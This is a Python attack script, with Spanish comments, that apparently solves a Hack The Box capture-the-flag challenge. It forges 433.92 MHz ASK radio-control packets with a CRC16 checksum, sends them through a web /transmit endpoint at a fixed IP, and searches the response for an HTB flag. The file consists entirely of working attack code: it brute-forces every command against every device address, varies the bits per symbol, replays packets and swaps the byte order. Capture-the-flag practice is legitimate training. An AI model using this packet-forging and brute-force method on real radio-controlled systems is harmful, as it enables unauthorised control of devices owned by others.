#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 9: Enviar TODOS los comandos posibles a TODOS los dispositivos
print("[*] INNOVACIÓN 9: Bombardeo total de comandos")
s = requests.Session()
s.get(base_url)

commands = [0xF1, 0xA0, 0x03, 0x91, 0x53, 0xFF, 0xEE]
addresses = [0xA1, 0xA2, 0xA3, 0xA4, 0xE1, 0xE2, 0xE3]

for addr in addresses:
    for cmd in commands:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

time.sleep(3)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 10: Probar con diferentes bits/symbol
print("\n[*] INNOVACIÓN 10: Diferentes bits/symbol")
for bits in ['1', '2', '4', '8', '16']:
    s = requests.Session()
    s.get(base_url)
    
    for addr in [0xE1, 0xE2, 0xE3]:
        data = bytes([addr, 0xFF])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': bits, 'msg': packet})
    
    for addr in [0xA1, 0xA2, 0xA3, 0xA4]:
        data = bytes([addr, 0xF1])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': bits, 'msg': packet})
    
    time.sleep(2)
    r = s.get(base_url)
    if re.findall(r'HTB\{[^}]+\}', r.text):
        print(f"[SUCCESS with bits={bits}]", re.findall(r'HTB\{[^}]+\}', r.text))
        break

# INNOVACIÓN 11: Paquetes duplicados
print("\n[*] INNOVACIÓN 11: Enviar cada paquete 3 veces")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    for _ in range(3):
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
        time.sleep(0.05)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 12: Comando + Dirección (orden inverso)
print("\n[*] INNOVACIÓN 12: CMD + ADDR en lugar de ADDR + CMD")
s = requests.Session()
s.get(base_url)

for cmd, addr in [(0xFF, 0xE1), (0xFF, 0xE2), (0xFF, 0xE3), (0xF1, 0xA1), (0xF1, 0xA2), (0xF1, 0xA3), (0xF1, 0xA4)]:
    data = bytes([cmd, addr])  # INVERTIDO
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag")
